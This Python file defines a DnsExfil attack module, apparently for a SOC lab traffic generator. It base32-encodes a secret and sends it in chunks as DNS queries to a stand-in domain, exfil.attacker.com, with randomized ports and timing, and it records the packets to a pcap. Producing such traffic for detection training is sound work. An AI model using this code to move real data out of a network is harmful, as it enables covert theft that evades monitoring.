import random, time, base64
from scapy.all import Ether, IP, UDP, DNS, DNSQR, sendp, get_if_addr
from attacks.base import BaseAttack


class DnsExfil(BaseAttack):
    def run(self):
        target_ip  = self.params.get("target_ip", "8.8.8.8")
        c2_domain  = self.params.get("domain", "exfil.attacker.com")
        secret     = self.params.get("message", "CONFIDENTIAL-SOC-LAB-EXFIL-TEST")

        src_ip  = get_if_addr(self.iface)
        encoded = base64.b32encode(secret.encode()).decode().rstrip("=").lower()
        chunks  = [encoded[i:i+30] for i in range(0, len(encoded), 30)]
        writer  = self.open_pcap()

        self.log(f"DNS Exfil → {c2_domain} via {target_ip} | {len(chunks)} queries", "warn")
        self.log(f"Encoded payload: {encoded}", "info")

        for idx, chunk in enumerate(chunks):
            if self._stop.is_set(): break
            fqdn = f"{idx:02d}-{chunk}.{c2_domain}"
            pkt  = (
                Ether()
                / IP(src=src_ip, dst=target_ip)
                / UDP(sport=random.randint(1024, 65535), dport=53)
                / DNS(rd=1, id=random.randint(1, 0xFFFF),
                      qd=DNSQR(qname=fqdn, qtype="A"))
            )
            try:
                sendp(pkt, iface=self.iface, verbose=False)
                self.write(pkt)
                self.log(f"Query {idx+1}/{len(chunks)}: {fqdn[:55]}", "info")
            except Exception as e:
                self.log(f"DNS Exfil error: {e}", "error")
            time.sleep(random.uniform(0.3, 1.2))

        writer.close()
        self.log("DNS Exfiltration: complete", "success")
